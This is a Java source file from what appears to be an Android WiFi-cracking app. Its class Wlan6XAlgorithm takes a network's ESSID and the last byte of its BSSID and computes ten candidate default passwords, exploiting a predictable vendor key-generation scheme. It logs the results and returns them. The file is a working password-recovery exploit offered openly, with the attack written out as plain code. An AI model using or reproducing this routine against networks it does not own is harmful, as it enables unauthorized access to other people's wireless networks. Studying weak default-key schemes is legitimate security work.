package es.pulimento.wifi.core.algorithms;

import java.util.ArrayList;
import java.util.List;

import android.util.Log;
import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * Wlan 6X algorithm.
 */
public class Wlan6XAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public Wlan6XAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	@Override
	protected void setPatterns() {
		
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		bssid_data = bssid_data.toUpperCase();

		return crack2(essid_data, bssid_data);
	}

	public static String crack2(String ESSID, String BSSID) {

		char[] ssidSubPart = ESSID.toCharArray();
		
		char[] bssidLastByte = new char[2];
		bssidLastByte[0] = BSSID.charAt(15);
		bssidLastByte[1] = BSSID.charAt(16);
		for (int k = 0; k < 6; ++k)
			if (ssidSubPart[k] >= 'A') ssidSubPart[k] = (char) (ssidSubPart[k] - 55);

		if (bssidLastByte[0] >= 'A') bssidLastByte[0] = (char) (bssidLastByte[0] - 55);
		if (bssidLastByte[1] >= 'A') bssidLastByte[1] = (char) (bssidLastByte[1] - 55);

		List<String> passList = new ArrayList<String>();
		for (int i = 0; i < 10; ++i) {
			/* Do not change the order of this instructions */
			int aux = i + (ssidSubPart[3] & 0xf) + (bssidLastByte[0] & 0xf) + (bssidLastByte[1] & 0xf);
			int aux1 = (ssidSubPart[1] & 0xf) + (ssidSubPart[2] & 0xf) + (ssidSubPart[4] & 0xf) + (ssidSubPart[5] & 0xf);
			int second = aux ^ (ssidSubPart[5] & 0xf);
			int sixth = aux ^ (ssidSubPart[4] & 0xf);
			int tenth = aux ^ (ssidSubPart[3] & 0xf);
			int third = aux1 ^ (ssidSubPart[2] & 0xf);
			int seventh = aux1 ^ (bssidLastByte[0] & 0xf);
			int eleventh = aux1 ^ (bssidLastByte[1] & 0xf);
			int fourth = (bssidLastByte[0] & 0xf) ^ (ssidSubPart[5] & 0xf);
			int eighth = (bssidLastByte[1] & 0xf) ^ (ssidSubPart[4] & 0xf);
			int twelfth = aux ^ aux1;
			int fifth = second ^ eighth;
			int ninth = seventh ^ eleventh;
			int thirteenth = third ^ tenth;
			int first = twelfth ^ sixth;
			String key = Integer.toHexString(first & 0xf) + Integer.toHexString(second & 0xf)
					+ Integer.toHexString(third & 0xf) + Integer.toHexString(fourth & 0xf)
					+ Integer.toHexString(fifth & 0xf) + Integer.toHexString(sixth & 0xf)
					+ Integer.toHexString(seventh & 0xf) + Integer.toHexString(eighth & 0xf)
					+ Integer.toHexString(ninth & 0xf) + Integer.toHexString(tenth & 0xf)
					+ Integer.toHexString(eleventh & 0xf) + Integer.toHexString(twelfth & 0xf)
					+ Integer.toHexString(thirteenth & 0xf);

			passList.add(key.toUpperCase());
		}
		StringBuilder s = new StringBuilder();
		for (String sp : passList)
			s.append(sp + "\n");
		Log.d("pulWifi", "CLAVE -> " + s.toString());
		return s.toString();
	}

	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return false;
	}

}
